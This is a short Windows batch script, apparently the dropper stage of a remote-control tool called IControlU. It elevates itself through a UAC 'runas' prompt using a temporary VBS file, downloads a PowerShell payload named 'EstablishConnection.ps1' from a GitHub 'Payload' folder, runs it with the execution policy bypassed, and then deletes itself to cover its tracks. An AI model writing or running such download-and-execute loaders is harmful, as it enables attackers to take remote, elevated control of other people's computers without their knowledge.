@REM Script to run file as administrator

@echo off
:-------------------------------------
if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
if '%ERRORLEVEL%' NEQ '0' (
    echo Getting administrative privileges...
    goto UACPrompt
) else ( goto GotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%TEMP%\Upgrade.vbs"
    set Params= %*
    echo UAC.ShellExecute "cmd", "/c ""%~s0"" %Params:"=""%", "", "runas", 1 >> "%TEMP%\Upgrade.vbs"

    "%temp%\Upgrade.vbs"
    del "%temp%\Upgrade.vbs"
    exit /B

:GotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

powershell -command "Invoke-WebRequest -Uri 'https://github.com/ReylanTeo/IControlU/blob/d32a82143adcca323a8f82aa1bef1edab65af7da/Payload/EstablishConnection.ps1' -OutFile 'EstablishConnection.ps1'"
PowerShell -ExecutionPolicy Bypass -File .\EstablishConnection.ps1

del PrivilegeEscalation.cmd